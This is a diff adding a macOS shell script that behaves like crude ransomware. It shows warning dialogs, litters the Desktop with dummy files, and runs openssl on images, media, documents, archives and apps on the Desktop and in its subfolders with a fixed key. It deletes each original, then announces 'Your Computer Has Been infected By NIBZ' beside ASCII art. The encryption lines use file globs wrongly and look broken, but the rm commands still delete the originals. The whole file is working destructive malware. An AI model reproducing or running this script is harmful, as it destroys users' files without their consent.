@@ -1,0 +1,146 @@
+osascript -e 'tell application (path to frontmost application as text) to display dialog "I am Warning You Force Quit Me!!!!" buttons {"OK"} with icon stop'
+
+cd /Users/$USER/Desktop
+
+touch 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77
+
+cd /Users/$USER/Desktop
+
+openssl aes-128-cbc -in *.jpg -out *.jpg..prrt -k 123
+
+rm *.jpg
+
+openssl aes-128-cbc -in *.mp4 -out *.mp4..prrt -k 123
+
+rm *.mp4
+
+openssl aes-128-cbc -in *.mp3 -out *.mp3..prrt -k 123
+
+rm *.mp3
+
+openssl aes-128-cbc -in *.png -out *.png..prrt -k 123
+
+rm *.png
+
+openssl aes-128-cbc -in *.zip -out *.zip..prrt -k 123
+
+rm *.zip
+
+openssl aes-128-cbc -in *.doc -out *.doc..prrt -k 123
+
+rm *.doc
+
+openssl aes-128-cbc -in *.odt -out *.odt..prrt -k 123
+
+rm *.odt
+
+openssl aes-128-cbc -in *.pdf -out *.pdf..prrt -k 123
+
+rm *.pdf
+
+openssl aes-128-cbc -in *.rtf -out *.rtf..prrt -k 123
+
+rm *.rtf
+
+openssl aes-128-cbc -in *.tex -out *.tex..prrt -k 123
+
+rm *.tex
+
+openssl aes-128-cbc -in *.txt -out *.txt..prrt -k 123
+
+rm *.txt
+
+openssl aes-128-cbc -in *.wks -out *.wks..prrt -k 123
+
+rm *.wks
+
+openssl aes-128-cbc -in *.wps -out *.wps..prrt -k 123
+
+rm *.wps
+
+openssl aes-128-cbc -in *.wpd -out *.wpd..prrt -k 123
+
+rm *.wpd
+
+openssl aes-128-cbc -in *.webloc -out *.webloc..prrt -k 123
+
+rm *.webloc
+
+openssl aes-128-cbc -in *.app -out *.app..prrt -k 123
+
+rm *.app
+
+
+cd /Users/$USER/Desktop/*
+
+openssl aes-128-cbc -in *.jpg -out *.jpg..prrt -k 123
+
+rm *.jpg
+
+openssl aes-128-cbc -in *.png -out *.png..prrt -k 123
+
+rm *.png
+
+openssl aes-128-cbc -in *.zip -out *.zip..prrt -k 123
+
+rm *.zip
+
+openssl aes-128-cbc -in *.doc -out *.doc..prrt -k 123
+
+rm *.doc
+
+openssl aes-128-cbc -in *.odt -out *.odt..prrt -k 123
+
+rm *.odt
+
+openssl aes-128-cbc -in *.pdf -out *.pdf..prrt -k 123
+
+rm *.pdf
+
+openssl aes-128-cbc -in *.rtf -out *.rtf..prrt -k 123
+
+rm *.rtf
+
+openssl aes-128-cbc -in *.tex -out *.tex..prrt -k 123
+
+rm *.tex
+
+openssl aes-128-cbc -in *.txt -out *.txt..prrt -k 123
+
+rm *.txt
+
+openssl aes-128-cbc -in *.wks -out *.wks..prrt -k 123
+
+rm *.wks
+
+openssl aes-128-cbc -in *.wps -out *.wps..prrt -k 123
+
+rm *.wps
+
+openssl aes-128-cbc -in *.wpd -out *.wpd..prrt -k 123
+
+rm *.wpd
+
+openssl aes-128-cbc -in *.webloc -out *.webloc..prrt -k 123
+
+rm *.webloc
+
+openssl aes-128-cbc -in *.app -out *.app..prrt -k 123
+
+cd /Users/$USER/Desktop/MEMEZ
+
+open PRRT2 
+open DERP2
+
+echo -e " ▒▒▒▒▒▒▒█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
+▒▒▒▒▒▒▒█░▒▒▒▒▒▒▒▓▒▒▓▒▒▒▒▒▒▒░█
+▒▒▒▒▒▒▒█░▒▒▓▒▒▒▒▒▒▒▒▒▄▄▒▓▒▒░█░▄▄
+▒▒▄▀▀▄▄█░▒▒▒▒▒▒▓▒▒▒▒█░░▀▄▄▄▄▄▀░░█
+▒▒█░░░░█░▒▒▒▒▒▒▒▒▒▒▒█░░░░░░░░░░░█
+▒▒▒▀▀▄▄█░▒▒▒▒▓▒▒▒▓▒█░░░█▒░░░░█▒░░█
+▒▒▒▒▒▒▒█░▒▓▒▒▒▒▓▒▒▒█░░░░░░░▀░░░░░█
+▒▒▒▒▒▄▄█░▒▒▒▓▒▒▒▒▒▒▒█░░█▄▄█▄▄█░░█
+▒▒▒▒█░░░█▄▄▄▄▄▄▄▄▄▄█░█▄▄▄▄▄▄▄▄▄█
+▒▒▒▒█▄▄█░░█▄▄█░░░░░░█▄▄█░░█▄▄█ "
+
+osascript -e 'tell application (path to frontmost application as text) to display dialog "Your Computer Has Been infected By NIBZ" buttons {"OK"} with icon stop'
